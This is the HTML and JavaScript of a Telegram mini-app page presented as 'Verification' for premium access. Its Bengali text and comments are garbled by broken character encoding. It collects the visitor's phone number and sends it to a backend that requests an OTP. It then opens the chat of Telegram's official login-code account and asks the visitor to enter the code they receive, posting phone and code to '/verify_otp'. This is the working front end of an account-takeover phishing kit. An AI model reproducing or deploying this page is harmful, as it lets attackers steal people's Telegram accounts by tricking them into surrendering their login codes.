<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verification</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    /* ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ü‡¶ó‡ßá‡¶∞ CSS ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶•‡¶æ‡¶ï‡¶¨‡ßá */
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-10px); }
      75% { transform: translateX(10px); }
    }
    .error-shake {
      animation: shake 0.2s ease-in-out 0s 2;
      box-shadow: 0 0 15px red !important;
      border: 2px solid red !important;
    }
    .hidden { display: none; }
  </style>
</head>
<body>

  <div id="numberSection" style="text-align: center; margin-top: 50px;">
    <h2>‡¶™‡ßç‡¶∞‡¶ø‡¶Æ‡¶ø‡ßü‡¶æ‡¶Æ ‡¶è‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶™‡ßá‡¶§‡ßá ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á ‡¶ï‡¶∞‡ßÅ‡¶®</h2>
    <button id="shareContactBtn" style="padding: 15px 30px; font-size: 18px; cursor: pointer;">
      Enter ‚úÖ (Share Number)
    </button>
  </div>

  <div id="otpSection" class="hidden">
    <input type="text" id="codeInput" placeholder="Enter OTP" readonly>
    <div class="keypad">
        </div>
    <button class="get-code-btn">Get Code üîë</button>
  </div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.expand(); // ‡¶´‡ßÅ‡¶≤ ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶ï‡¶∞‡¶¨‡ßá

    let userPhone = ""; 

    // ‡ßß. ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶≤‡¶ú‡¶ø‡¶ï
    document.getElementById('shareContactBtn').addEventListener('click', () => {
        // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá‡¶∞ ‡¶ï‡¶æ‡¶õ‡ßá ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶ö‡¶æ‡¶ì‡ßü‡¶æ‡¶∞ ‡¶¨‡¶æ‡¶ü‡¶® ‡¶∞‡¶ø‡¶ï‡ßã‡ßü‡ßá‡¶∏‡ßç‡¶ü
        tg.requestContact((ok) => {
            if (ok) {
                // ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶ó‡ßá‡¶≤‡ßá ‡¶§‡¶æ ‡¶™‡¶æ‡¶á‡¶•‡¶®‡ßá ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶ì‡¶ü‡¶ø‡¶™‡¶ø ‡¶∞‡¶ø‡¶ï‡ßã‡ßü‡ßá‡¶∏‡ßç‡¶ü ‡¶ï‡¶∞‡¶¨‡ßá
                userPhone = tg.initDataUnsafe.user.phone_number;
                
                fetch('/send_otp', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: userPhone })
                }).then(res => {
                    if(res.ok) {
                        document.getElementById('numberSection').classList.add('hidden');
                        document.getElementById('otpSection').classList.remove('hidden');
                    }
                });
            } else {
                alert("‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶®‡¶æ ‡¶ï‡¶∞‡¶≤‡ßá ‡¶è‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶™‡¶æ‡¶¨‡ßá‡¶® ‡¶®‡¶æ!");
            }
        });
    });

    // ‡ß®. ‡¶ì‡¶ü‡¶ø‡¶™‡¶ø ‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü ‡¶≤‡¶ú‡¶ø‡¶ï
    document.querySelector('.get-code-btn').addEventListener('click', async () => {
      const otp = document.getElementById('codeInput').value;
      if (otp.length < 5) {
        triggerError();
        return;
      }

      // ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶Ö‡¶´‡¶ø‡¶∂‡¶ø‡ßü‡¶æ‡¶≤ ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶ï‡ßã‡¶° ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü‡ßá ‡¶®‡¶ø‡ßü‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá
      window.open('tg://user?id=777000', '_blank');

      const response = await fetch('/verify_otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone, otp: otp })
      });

      if (!response.ok) triggerError();
      else alert("‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á ‡¶π‡ßü‡ßá‡¶õ‡ßá!");
    });

    function triggerError() {
      const input = document.getElementById('codeInput');
      input.classList.add('error-shake');
      setTimeout(() => {
        input.classList.remove('error-shake');
        input.value = '';
      }, 1000);
    }

    // ‡¶ï‡¶ø‡¶™‡ßç‡¶Ø‡¶æ‡¶° ‡¶≤‡¶ú‡¶ø‡¶ï ‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶Æ‡¶§‡ßã‡¶á ‡¶•‡¶æ‡¶ï‡¶¨‡ßá
  </script>
</body>
</html>
